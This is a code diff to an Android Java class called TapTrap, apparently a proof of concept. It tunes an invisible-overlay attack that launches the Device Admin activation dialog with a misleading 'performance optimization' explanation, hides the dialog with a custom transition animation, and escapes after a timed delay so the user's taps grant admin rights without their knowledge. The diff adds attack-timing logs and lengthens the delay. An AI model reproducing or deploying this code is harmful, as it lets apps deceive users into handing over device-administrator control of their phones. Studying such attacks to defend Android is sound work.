@@ -46,23 +46,52 @@ public class TapTrap {
     }
 
     public void launchDeviceAdminTrap() {
+        long startTime = System.currentTimeMillis();
+        Log.d("TapTrap_TIMING", "========== ATTACK STARTED ==========");
+        Log.d("TapTrap_TIMING", "Start time: " + startTime + "ms");
+
         // Intent to activate Device Admin
         Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
         intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
         intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                 "Required for performance optimization");
 
+        long beforeLaunch = System.currentTimeMillis();
+        Log.d("TapTrap_TIMING", "Before startActivity: " + beforeLaunch +
+                "ms (elapsed: " + (beforeLaunch - startTime) + "ms)");
+
+
         // 🔴 LAUNCH SYSTEM DIALOG
         activity.startActivity(intent);
 
+        long afterLaunch = System.currentTimeMillis();
+        Log.d("TapTrap_TIMING", "After startActivity: " + afterLaunch +
+                "ms (elapsed: " + (afterLaunch - startTime) + "ms)");
+
         // 🔴 MAKE IT INVISIBLE
-        activity.overridePendingTransition(R.anim.ani, 1);
+        activity.overridePendingTransition(R.anim.ani_scale, 0);
+
+        long afterAnimation = System.currentTimeMillis();
+        Log.d("TapTrap_TIMING", "After overridePendingTransition: " + afterAnimation +
+                "ms (elapsed: " + (afterAnimation - startTime) + "ms)");
+
 
         // 🔴 ESCAPE BEFORE DIALOG BECOMES VISIBLE (2.8 seconds)
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
+
+            long beforeEscape = System.currentTimeMillis();
+            Log.d("TapTrap_TIMING", "=== ESCAPE PHASE ===");
+            Log.d("TapTrap_TIMING", "Before escape: " + beforeEscape +
+                    "ms (total elapsed: " + (beforeEscape - startTime) + "ms)");
+
             activity.startActivity(new Intent(activity, activity.getClass()));
             activity.finish();
-        }, 2800);
+
+            long afterEscape = System.currentTimeMillis();
+            Log.d("TapTrap_TIMING", "After escape: " + afterEscape +
+                    "ms (total elapsed: " + (afterEscape - startTime) + "ms)");
+            Log.d("TapTrap_TIMING", "========== ATTACK COMPLETE ==========");
+        }, 3500);
 
 
     }
